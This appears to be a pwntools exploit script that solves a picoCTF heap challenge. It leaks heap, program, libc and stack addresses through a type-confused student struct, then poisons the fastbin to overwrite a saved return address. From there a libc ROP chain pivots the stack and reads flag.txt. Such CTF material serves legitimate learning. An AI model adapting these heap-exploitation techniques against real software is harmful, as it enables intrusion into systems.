#!/usr/bin/env python3

from pwn import *

exe = ELF("chall.patch")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31638)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript="c")
    else:
        return process([exe.path])

MENU_DELIM = b"4. Remote student\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"

def leak_heap(r):

    # if we free and don't reallocate
    # the name pointer will be pointing to a tcache heap chunk
    # which has a pointer to the next chunk in that tcache
    # we can snag that with the name print

    r.sendline(b"0 0 0")

    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([b"48" for x in range(24)]))

    # empty tcache and then create another student, allowing us to refill it to 6
    for i in range(6): 
        r.sendlineafter(MENU_DELIM, f"0 {i + 1} 0".encode())
    r.sendlineafter(MENU_DELIM, b"4 1")
    r.sendlineafter(MENU_DELIM, b"4 2")
    r.sendlineafter(MENU_DELIM, b"4 0")
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"2 0")

    heap_value = u64(r.recvline().rstrip().ljust(8,b"\x00"))

    r.recvuntil(b"choice: \n")
    return heap_value - 0x13cf0

def leak_program_base(r):

    # student structs have a vtable ptr
    # lets just snag that and calculate program base

    r.sendline(b"0 0 0")

    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([b"48" for x in range(24)]))

    r.sendlineafter(MENU_DELIM, b"4 3") # students were populated when leaking heap, can just use one of those lol
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"4 0")
    r.sendline(b"0 1 0")

    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"2 0")

    program_value = u64(r.recvline().rstrip().ljust(8,b"\x00"))

    r.recvuntil(b"choice: \n")
    return program_value - 0x202ce8

def leak_libc_base(r, program_base):

    # we can retrieve a libc address from the GOT
    # assuming we have the program base


    got_malloc_offset = 0x202f88

    r.sendline(b"0 0 0") # alloc student 0, 0 virtual

    r.sendlineafter(MENU_DELIM, b"0 1 0") 

    r.sendlineafter(MENU_DELIM, b"4 0")

    r.sendlineafter(MENU_DELIM, b"1 1 24") # set name for student 1, size 24

    fake_student = b"AAAAAAAA" + p64(program_base + got_malloc_offset) + p64(8)

    r.sendline(b" ".join([str(fake_student[x]).encode() for x in range(24)]))

    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"2 0")


    malloc_addr = u64(r.recv(6).rstrip().ljust(8,b"\x00"))

    r.recvuntil(b"choice: \n")

    return malloc_addr - 0x97140 # offset of malloc from libc base

def leak_stack_base(r, libc_base):

    # libc has a variable "environ" which stores a stack address
    # since we know libc base, we can just yoink that


    r.sendline(b"0 0 0")

    r.sendlineafter(MENU_DELIM, b"0 1 0") 

    r.sendlineafter(MENU_DELIM, b"4 0")

    r.sendlineafter(MENU_DELIM, b"1 1 24")


    # 0x3ee098 is environ address
    fake_student = b"AAAAAAAA" + p64(libc_base + 0x3ee098) + p64(8)

    r.sendline(b" ".join([str(fake_student[x]).encode() for x in range(24)]))

    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"2 0")


    env_addr = u64(r.recv(6).rstrip().ljust(8,b"\x00"))

    r.recvuntil(b"choice: \n")
    
    return env_addr - 0x130 # -0x130 is the offset from environ to the set_name stored rip


def poison_fastbin(r, target, value):

    assert(len(value) == 24)


    # first we empty tcache

    for i in range(9):
        r.sendline(f"0 {i} 0".encode())
        r.recvuntil(b"choice: \n")

    for i in range(7):
        r.sendline(f"4 {2+i}".encode())
        r.recvuntil(b"choice: \n")

    # # now, to populate fastbins with a dupe

    r.sendline(b"4 0")
    r.sendline(b"4 1")
    r.sendline(b"4 0")

    for i in range(3):
        r.recvuntil(b"choice: \n")

    # # lets just empty tcache real quick

    for i in range(7):
        r.sendline(f"0 3 0".encode())
        r.recvuntil(b"choice: \n")

    r.sendline(b"1 0 24")


    # we have a duplicate chunk in fastbin
    # so what we want to do is write over the next pointer
    # allowing us to artificially extend fastbin
    # and tricking malloc into returning an arbitrary pointer

    dup_chunk = p64(target) + b"A" * 16
    r.sendline(b" ".join([str(dup_chunk[x]).encode() for x in range(24)]))

    # here we use up the rest of real fastbin so the next pointer is our fake pointer

    r.sendline(b"0 0 0")
    r.sendline(b"0 0 0")

    # allocate our fake pointer and write "value" to it

    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([str(value[x]).encode() for x in range(24)]))

    for i in range(4):
        r.recvuntil(b"choice: \n")


def main():
    r = conn()

    r.recvuntil(MENU_DELIM)


    # first, leak useful info
    # arbitrary read by way of type confusion
    # essentially we allocate and free a student
    # and then allocate a name of same size
    # these will share an address
    # and so we can construct a fake student
    # by controlling the name pointer in the student struct
    # we can read whatever we want

    heap_base = leak_heap(r)
    log.info("heap base: " + hex(heap_base))

    program_base = leak_program_base(r)
    log.info("program base: " + hex(program_base))

    libc_base = leak_libc_base(r, program_base)

    log.info("libc base: " + hex(libc_base))

    stack_ret = leak_stack_base(r, libc_base)

    log.info("stored RIP: " + hex(stack_ret))

    # all gadgets are from libc for convenience

    pop_rax = libc_base + 0x43ae8
    pop_rdi = libc_base + 0x215bf
    pop_rsi = libc_base + 0x23eea
    pop_rdx = libc_base + 0x1b96
    syscall_ret = libc_base + 0xd2745
    pop_rsp = libc_base + 0x3960


    # heap addresses are predictable and if you allocate in the same pattern
    # you can just reuse offsets

    flag_heap_addr = heap_base + 0x13630
    heap_rop_address = heap_base + 0x12dd0

    # find a nice empty chunk in rw program memory for the flag
    flag_read_address = program_base + 0x203048


    # open/read/write syscall chain

    chain = b""
    chain += p64(pop_rax) + p64(2)
    chain += p64(pop_rdi) + p64(flag_heap_addr)
    chain += p64(pop_rsi) + p64(0)
    chain += p64(pop_rdx) + p64(0)
    chain += p64(syscall_ret)

    chain += p64(pop_rax) + p64(0)
    chain += p64(pop_rdi) + p64(3)
    chain += p64(pop_rsi) + p64(flag_read_address)
    chain += p64(pop_rdx) + p64(64)
    chain += p64(syscall_ret)

    chain += p64(pop_rax) + p64(1)
    chain += p64(pop_rdi) + p64(1)
    chain += p64(pop_rsi) + p64(flag_read_address)
    chain += p64(pop_rdx) + p64(64)
    chain += p64(syscall_ret)


    # put rop chain and "flag.txt" on heap
    # addresses are calculated in advance bc it's predictable

    r.sendline(b"0 15 0")
    r.sendline(b"1 15 500")
    r.sendline(b" ".join([str(x).encode() for x in chain.ljust(500,b"\x00")]))

    r.sendline(b"0 14 0")
    r.sendline(b"1 14 500")
    r.sendline(b" ".join([str(x).encode() for x in b"flag.txt".ljust(500,b"\x00")]))

    for i in range(3):
        r.recvuntil(b"choice: \n")

    poison_fastbin(r, stack_ret, p64(pop_rsp) + p64(heap_rop_address) + p64(0))


    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

